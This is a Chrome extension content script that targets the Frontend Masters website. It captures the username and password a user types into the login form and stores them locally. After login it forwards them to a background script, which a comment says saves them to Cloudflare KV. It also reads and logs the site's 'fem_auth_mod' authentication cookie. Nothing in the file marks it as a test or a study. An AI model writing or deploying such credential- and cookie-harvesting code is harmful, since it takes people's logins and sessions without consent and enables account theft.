// Content script for a Chrome Extension

// console.log("Content script running");

// Checks if the user is logged in by looking for a "Logout" link
function isLoggedIn() {
  const logoutLink = Array.from(document.querySelectorAll("a")).find((el) =>
    el.textContent.includes("Logout")
  );
  return !!logoutLink;
}

// Requests a cookie if the user is logged in
function requestCookie(name, callback) {
  if (isLoggedIn()) {
    console.log(`User is logged in. Requesting cookie with name: ${name}`);
    chrome.runtime.sendMessage(
      { action: "getCookie", name: name },
      (response) => {
        // console.log(`Received response for cookie request: ${name}`, response);
        callback(response);
      }
    );
  } else {
    // console.log("User is not logged in, not requesting cookie.");
  }
}

// Checks if a "Log In" button exists, indicating the user is logged out
function isLoggedOut() {
  const loginButton = Array.from(document.querySelectorAll("button")).find(
    (el) => el.textContent.trim() === "Log In"
  );
  // console.log(
  //   "Checking login status:",
  //   !!loginButton ? "Logged out" : "Logged in"
  // );
  return !!loginButton;
}

// Object to store the credentials entered by the user
let credentials = {
  username: "",
  password: "",
};

// Handles input changes and saves updated credentials to chrome.storage.local
function handleInputChange(event) {
  if (isLoggedOut()) {
    credentials[event.target.id] = event.target.value;
    console.log(`Input changed - ${event.target.id}: `, event.target.value);
    chrome.storage.local.set({ tempCredentials: credentials }, () => {
      if (chrome.runtime.lastError) {
        console.log(`Error: ${chrome.runtime.lastError.message}`);
        console.error(
          "Error setting credentials in chrome.storage:",
          chrome.runtime.lastError
        );
      } else {
        console.log("Credentials saved in chrome.storage.");
      }
    });
  } else {
    console.log("User is logged in, not saving credentials.");
  }
}

// Sends credentials from local storage to the background script
function sendCredentialsToBackground() {
  chrome.storage.local.get("tempCredentials", (data) => {
    if (data.tempCredentials) {
      chrome.runtime.sendMessage(
        { action: "saveCredentials", credentials: data.tempCredentials },
        (response) => {
          if (chrome.runtime.lastError) {
            console.error(
              "Error sending message to background script:",
              chrome.runtime.lastError
            );
          } else {
            // console.log("Received response from background script:", response);
          }
        }
      );
    }
  });
}

// Sets up change event listeners for username and password inputs if the user is not logged in
if (isLoggedOut()) {
  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");

  if (usernameInput) {
    usernameInput.addEventListener("change", handleInputChange);
    console.log("Username input listener added.");
  } else {
    console.log("Username input not found.");
  }

  if (passwordInput) {
    passwordInput.addEventListener("change", handleInputChange);
    console.log("Password input listener added.");
  } else {
    console.log("Password input not found.");
  }
}

// Function to save credentials to Cloudflare KV
function saveCredentialsToCloudflare() {
  console.log("Saving credentials to Cloudflare.");

  // Sending a message to the background script with the credentials
  chrome.runtime.sendMessage(
    { action: "saveCredentials", credentials: credentials },
    (response) => {
      if (chrome.runtime.lastError) {
        console.error(
          "Error sending message to background script:",
          chrome.runtime.lastError
        );
      } else {
        console.log("Received response from background script:", response);
      }
    }
  );
}

// Event listener to check for URL changes after page load
window.addEventListener("load", () => {
  const currentUrl = window.location.href;
  // console.log("Page loaded, current URL:", currentUrl);

  if (currentUrl.includes("https://frontendmasters.com/dashboard/")) {
    // console.log(
    //   "Detected dashboard URL, proceeding to send credentials to background."
    // );
    sendCredentialsToBackground();
  } else {
    // console.log("Not on dashboard URL, not sending credentials.");
  }
});

// Event listener for successful login, triggering the save to Cloudflare KV
window.addEventListener("load", () => {
  const currentUrl = window.location.href;

  if (currentUrl.includes("https://frontendmasters.com/dashboard/")) {
    // console.log("Dashboard URL detected after login, saving credentials.");
    saveCredentialsToCloudflare();
  }
});

// Initial cookie request
requestCookie("fem_auth_mod", (response) => {
  if (response && response.cookie) {
    console.log("Cookie value:", response.cookie.value);
  } else {
    console.log("Cookie not found or response is empty");
  }
});
